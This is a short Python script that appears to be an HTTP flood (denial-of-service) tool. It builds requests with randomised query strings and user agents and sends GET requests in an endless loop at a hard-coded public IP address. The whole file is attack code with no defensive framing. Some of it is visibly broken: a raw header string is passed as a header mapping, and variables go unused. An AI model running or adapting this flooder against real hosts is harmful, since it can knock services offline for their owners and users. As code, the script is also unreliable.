import random
import string
import socket
import aiohttp
import asyncio

user_agents = []
refer = []


def generate_str(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, size)))


def setup():
    global user_agents, refer

    t = open("user-agents.txt", "r")
    user_agents = [l.strip() for l in t.readlines()]
    t.close()

    refer = [
        'https://www.google.com/?q=',
        'https://www.usatoday.com/search/results?q=',
        'https://engadget.search.aol.com/search?q=',
        'https://cloudfare.com',
        'https://github.com',
        'https://en.wikipedia.org',
        'https://youtu.be',
        'https://mozilla.org',
        'https://microsoft.com',
        'https://wordpress.org'
    ]


def get_header(url):
    src_IP = "192.168.71.1/example1.html"
    req = url + "/?" + generate_str(8) + '=' + generate_str(8)
    print(req)

    header = 'GET {} HTTP/1.1\r\n' \
             'Host : {}\r\n' \
             'Accept: text/html,application/xhtml+xml,application/xml;\r\n' \
             'q=0.9,image/webp,image/apng,*/*;q=0.8\r\n' \
             'User-Agent : {}\r\n' \
             'Cache-Control : no-cache\r\n\r\n'\
             .format(req, "192.168.71.128", random.choice(user_agents))

    print(header)

    return header, req


async def attack(url, header):
    async with aiohttp.ClientSession() as sess:
        async with sess.get(url=url, headers=header) as res:
            return await res.json()


async def main(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=header) as resp:
            print(resp.status)
            print(await resp.text())


if __name__ == "__main__":
    target = "http://192.99.215.104"
    port = 80

    setup()
    #while 1:
    header, url = get_header(target)

    while 1:
        asyncio.run(main("http://192.99.215.104"))

    




